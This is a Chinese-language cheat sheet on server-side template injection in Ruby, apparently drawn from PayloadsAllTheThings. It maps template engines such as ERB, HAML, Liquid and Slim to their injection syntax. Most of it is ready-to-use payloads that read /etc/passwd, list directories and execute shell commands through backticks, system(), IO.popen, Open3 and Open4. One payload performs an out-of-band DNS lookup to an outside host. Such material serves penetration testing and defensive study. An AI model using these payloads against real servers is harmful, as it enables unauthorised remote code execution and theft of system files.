# SSTI Ruby - Ruby服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution File Read Command Execution
关键词: SSTI ERB Erubi Erubis HAML Liquid Mustache Slim Ruby
技术: ERB Template Injection system() exec() IO.popen Open3 Open4
框架: ERB Erubi Erubis HAML Liquid Mustache Slim

[CONTENT]

## SSTI Ruby概述

服务端模板注入(SSTI)是一种漏洞，攻击者可在服务端模板中注入恶意代码，导致服务器执行任意命令。Ruby中SSTI可发生在ERB、Haml、Liquid、Slim等模板引擎。

## 模板库Payload格式

| 模板名 | Payload格式 |
|--------|-------------|
| Erb | `<%= %>` |
| Erubi | `<%= %>` |
| Erubis | `<%= %>` |
| HAML | `#{ }` |
| Liquid | `{{ }}` |
| Mustache | `{{ }}` |
| Slim | `#{ }` |

## Ruby基本注入

### ERB模板

```ruby
<%= 7 * 7 %>
```

### Slim模板

```ruby
#{ 7 * 7 }
```

## 读取文件

```ruby
<%= File.open('/etc/passwd').read %>
```

## 列出文件和目录

```ruby
<%= Dir.entries('/') %>
```

## 命令执行

### ERB/Erubi/Erubis模板

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

### Slim模板

```powershell
#{ %x|env| }
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/Ruby.md